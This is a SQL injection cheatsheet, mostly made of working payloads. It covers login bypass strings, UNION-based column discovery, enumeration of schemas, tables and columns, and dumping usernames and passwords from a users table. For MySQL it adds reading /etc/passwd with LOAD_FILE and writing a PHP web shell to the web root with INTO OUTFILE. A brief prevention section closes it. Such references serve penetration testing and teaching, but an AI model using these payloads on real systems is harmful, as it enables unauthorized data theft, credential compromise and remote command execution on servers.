# SQL Injection (SQLi) Cheatsheet

## Introduction
SQL Injection (SQLi) allows an attacker to interfere with the queries that an application makes to its database. It can allow viewing data that is not normally retrievable, modifying data, or even executing administrative operations.

---

## Types of SQLi
1.  **In-Band (Classic)**:
    -   **Union-Based**: Uses the `UNION` operator to combine the results of two or more SELECT statements into a single result set.
    -   **Error-Based**: Forces the database to generate an error message that reveals information about the database structure.
2.  **Inferential (Blind)**:
    -   **Boolean-Based**: Sends queries to the database which force the application to return a different result depending on whether the query returns a TRUE or FALSE result.
    -   **Time-Based**: Sends queries that pause the database for a specified period if the query is TRUE.

---

## Discovery

### Authentication Bypass
Try to bypass login forms by making the condition always true.
```sql
admin' OR '1'='1' -- -
admin' OR '1'='1' #
admin' OR 1=1 --
```

### Identifying Injection Points
-   Add `'` or `"` to parameters to see if it causes an error.
-   **Boolean Test**:
    -   `id=1 AND 1=1` (Should return normal page)
    -   `id=1 AND 1=2` (Should return different/empty page)

---

## Exploitation (Union-Based)

### 1. Determine Number of Columns
Use `ORDER BY` to find the number of columns in the original query. Increment the number until you get an error.
```sql
' ORDER BY 1 -- -
' ORDER BY 2 -- -
' ORDER BY 3 -- -  <-- Error means there are 2 columns
```

### 2. Find Displayable Columns
Use `UNION SELECT` with the number of columns found. Check which numbers appear on the page.
```sql
' UNION SELECT 1, 2, 3 -- -
```
*Note: Ensure data types match. You can use `NULL` or strings if numbers fail.*

### 3. Enumeration
Once you know which columns are displayed (e.g., column 2), inject functions there.

| Information | MySQL / MariaDB | PostgreSQL | MSSQL |
| :--- | :--- | :--- | :--- |
| **Version** | `@@version` | `version()` | `@@version` |
| **Current User** | `user()`, `current_user()` | `current_user` | `user_name()` |
| **Database** | `database()` | `current_database()` | `db_name()` |

**Example:**
```sql
' UNION SELECT 1, database(), user(), 4 -- -
```

### 4. Database Schema Enumeration (MySQL)
**List Databases:**
```sql
' UNION SELECT 1, schema_name, 3, 4 FROM information_schema.schemata -- -
```

**List Tables (in current DB):**
```sql
' UNION SELECT 1, table_name, 3, 4 FROM information_schema.tables WHERE table_schema=database() -- -
```

**List Columns (in specific table):**
```sql
' UNION SELECT 1, column_name, 3, 4 FROM information_schema.columns WHERE table_name='users' -- -
```

### 5. Dumping Data
```sql
' UNION SELECT 1, username, password, 4 FROM users -- -
```
*Tip: Concatenate columns if you only have one display slot:*
```sql
' UNION SELECT 1, concat(username, ':', password), 3, 4 FROM users -- -
```

---

## Privilege Escalation & RCE (MySQL)

### Check Privileges
Check if the current user has `FILE` privilege (needed for reading/writing files).
```sql
' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user=user() -- -
' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'" -- -
```

### Reading Files (`LOAD_FILE`)
Read sensitive files like `/etc/passwd` or configuration files.
```sql
' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4 -- -
```

### Writing Files (`INTO OUTFILE`)
Write a web shell to the web root (requires `secure_file_priv` to be empty and write permissions).

1.  **Check `secure_file_priv`**:
    ```sql
    ' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv" -- -
    ```
2.  **Write Shell**:
    ```sql
    ' UNION SELECT 1, "<?php system($_GET['cmd']); ?>", 3, 4 INTO OUTFILE '/var/www/html/shell.php' -- -
    ```

---

## Prevention

1.  **Parameterized Queries (Prepared Statements)**: The most effective defense. Use placeholders (`?`) instead of concatenating input.
    ```php
    $stmt = $pdo->prepare('SELECT * FROM users WHERE email = ?');
    $stmt->execute([$email]);
    ```
2.  **Input Validation**: Validate against a whitelist (e.g., only allow integers for IDs).
3.  **Least Privilege**: Run the database service with a user that has minimum necessary privileges.
4.  **WAF**: Use a Web Application Firewall to block common SQL injection patterns.
